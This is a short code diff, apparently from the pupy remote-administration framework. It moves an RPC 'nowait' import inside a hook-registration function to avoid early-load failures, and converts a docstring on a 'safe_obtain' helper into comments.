@@ -27,8 +27,6 @@ else:
 
 import pupy
 
-from network.lib.rpc import nowait
-
 logger = pupy.get_logger('utils')
 
 def pupy_add_package(pkdic, compressed=False, name=None):
@@ -135,6 +133,9 @@ def register_package_request_hook(hook):
 
 
 def register_package_error_hook(hook):
+    # Must be importer at low level, because
+    # may not be possible to load network.* at early phase
+    from network.lib.rpc import nowait
     pupy.remote_print_error = nowait(hook)
 
 
@@ -147,7 +148,8 @@ def unregister_package_request_hook():
 
 
 def safe_obtain(proxy):
-    ''' Safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. '''
+    # Safe version of rpyc's rpyc.utils.classic.obtain,
+    # without using pickle.
 
     if type(proxy) in [list, str, bytes, dict, set, type(None)]:
         return proxy
